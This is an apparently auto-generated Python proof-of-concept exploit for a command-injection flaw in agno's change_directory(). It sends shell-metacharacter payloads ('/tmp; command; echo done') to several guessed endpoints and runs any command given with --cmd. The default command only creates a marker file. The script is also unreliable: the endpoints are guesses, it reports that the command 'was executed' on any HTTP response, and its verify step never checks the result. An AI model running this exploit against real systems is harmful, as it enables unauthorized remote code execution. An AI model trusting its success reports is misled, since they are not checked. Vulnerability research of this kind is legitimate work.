#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: rce-011
# Sink: run_shell_command
# Auto-generated — run with: python3 rce_run_shell_command_function_run_shell_command.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for agno RCE vulnerability.

Vulnerability: Command injection in change_directory() function.
The function passes user-controlled 'directory' parameter directly into an f-string
that is executed via subprocess.run() with shell=True (since args is a string).

Impact: Remote Code Execution (RCE) as the user running the agno service.

Usage:
    python3 poc.py --target http://localhost:8000
    python3 poc.py --target http://target.com:8080 --cmd "id"
"""

import argparse
import sys
import urllib.request
import urllib.parse
import urllib.error
import json
import time

def exploit(target_url, command):
    """
    Exploit the command injection in change_directory.
    
    The vulnerable endpoint likely accepts a 'directory' parameter.
    We inject shell metacharacters to execute arbitrary commands.
    """
    
    # Benign payload by default - creates a marker file
    if command is None:
        command = "touch /tmp/poc_success.txt"
    
    # URL encode the payload to handle special characters
    # The injection uses ';' to terminate the cd command and execute our payload
    payload = f"/tmp; {command}; echo done"
    
    # Construct the full URL - adjust endpoint path as needed
    # Common patterns: /api/change_directory, /change_directory, /tools/change_directory
    endpoints = [
        "/api/change_directory",
        "/change_directory",
        "/tools/change_directory",
        "/daytona/change_directory",
        "/api/v1/change_directory",
    ]
    
    for endpoint in endpoints:
        url = f"{target_url.rstrip('/')}{endpoint}"
        
        # Try POST with JSON body
        try:
            data = json.dumps({"directory": payload}).encode('utf-8')
            req = urllib.request.Request(
                url,
                data=data,
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            
            with urllib.request.urlopen(req, timeout=10) as response:
                result = response.read().decode('utf-8')
                print(f"[+] Endpoint {endpoint} responded (POST JSON): {result[:200]}")
                return True
                
        except urllib.error.HTTPError as e:
            # Try GET with query parameter
            try:
                params = urllib.parse.urlencode({"directory": payload})
                get_url = f"{url}?{params}"
                req = urllib.request.Request(get_url, method='GET')
                
                with urllib.request.urlopen(req, timeout=10) as response:
                    result = response.read().decode('utf-8')
                    print(f"[+] Endpoint {endpoint} responded (GET): {result[:200]}")
                    return True
                    
            except urllib.error.HTTPError as e2:
                if e2.code == 404:
                    continue  # Try next endpoint
                print(f"[-] HTTP error {e2.code} on {endpoint}: {e2.reason}")
                continue
            except urllib.error.URLError as e2:
                print(f"[-] Connection error on {endpoint}: {e2.reason}")
                continue
                
        except urllib.error.URLError as e:
            print(f"[-] Connection error on {endpoint}: {e.reason}")
            continue
        except Exception as e:
            print(f"[-] Unexpected error on {endpoint}: {e}")
            continue
    
    print("[-] No vulnerable endpoint found")
    return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for agno RCE via command injection in change_directory()"
    )
    parser.add_argument(
        "--target", "-t",
        required=True,
        help="Target URL (e.g., http://localhost:8000)"
    )
    parser.add_argument(
        "--cmd", "-c",
        default=None,
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--verify", "-v",
        action="store_true",
        help="Verify exploitation by checking if marker file was created"
    )
    
    args = parser.parse_args()
    
    print("[*] Starting agno RCE exploit")
    print(f"[*] Target: {args.target}")
    print(f"[*] Command: {args.cmd or 'touch /tmp/poc_success.txt'}")
    print()
    
    success = exploit(args.target, args.cmd)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        print("[+] The command was executed on the target system.")
        
        if args.verify and args.cmd is None:
            # Try to verify by checking if the marker file exists
            # This requires a second request to read the file
            print("[*] Attempting to verify exploitation...")
            verify_cmd = "cat /tmp/poc_success.txt 2>/dev/null || echo 'File not found'"
            exploit(args.target, verify_cmd)
    else:
        print("\n[-] Exploit failed - target may not be vulnerable or endpoint differs")
        print("[*] Try different endpoints or check the target manually")
        sys.exit(1)

if __name__ == "__main__":
    main()
